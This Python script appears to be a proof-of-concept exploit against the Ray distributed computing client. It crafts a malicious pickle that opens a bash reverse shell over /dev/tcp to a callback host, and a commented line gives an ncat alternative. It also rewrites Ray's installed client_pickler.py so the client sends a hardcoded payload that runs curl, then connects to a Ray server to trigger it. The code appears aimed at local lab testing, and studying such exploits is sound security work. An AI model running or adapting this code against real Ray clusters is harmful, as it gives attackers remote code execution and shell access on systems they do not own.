import re
from pathlib import Path

import ray
from ray.data import from_items


def generate_payload(host = "host.docker.internal", port = 4321):
    from ray.util.client.client_pickler import _orig_dumps_from_client

    class PickleRce(object):
        def __reduce__(self):
            import os

            # Netcat Payload
            # return os.system, ("ncat {host} {port} -e /bin/bash",)

            # LoL Payload
            return os.system, (f"/bin/bash -i > dev/tcp/{host}/{port} 0<&1 2>&1",)

    malicous_payload = str(
        _orig_dumps_from_client(PickleRce(), "98b1168c79934dcfa6312de646213572")
    )

    payload = f"{malicous_payload!r}".strip('"')[2:-1]

    return payload


def patch_client_pickler():
    """
    TODO: Write binary data as string. Currently using a manual patch
    SOURCE: https://github.com/ray-project/ray/blob/master/python/ray/util/client/client_pickler.py
    """
    patched_method = "".join(
        [
            f"def dumps_from_client(obj: Any, client_id: str, protocol=None) -> bytes:\n"
            f"    print('DUMPS FROM CLIENT CALLED!!!')\n"
            # Use `generate_payload` to generate the payload
            f"    return b'\x80\x05\x95@\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c%curl http://host.docker.internal:4321\x94\x85\x94R\x94.'\n\n"
        ]
    )

    client_pickler = Path(
        ".venv-3.8/lib/python3.8/site-packages/ray/util/client/client_pickler.py"
    )
    module_content = client_pickler.read_text()

    if "curl" not in module_content:
        method_pattern = re.compile(r"def dumps_from_client.*?\n\n", re.DOTALL)
        patched_module = re.sub(method_pattern, patched_method, module_content)
        client_pickler.write_text(patched_module)


# print(generate_payload())
# patch_client_pickler()


# Step 2 - Interact with the server
ray.init("ray://127.0.0.1:10001")

@ray.remote
def ray_data_task(x):
    return x * x

results = ray.get([
    ray_data_task.remote(item) for item in range(8)
])

print(results)
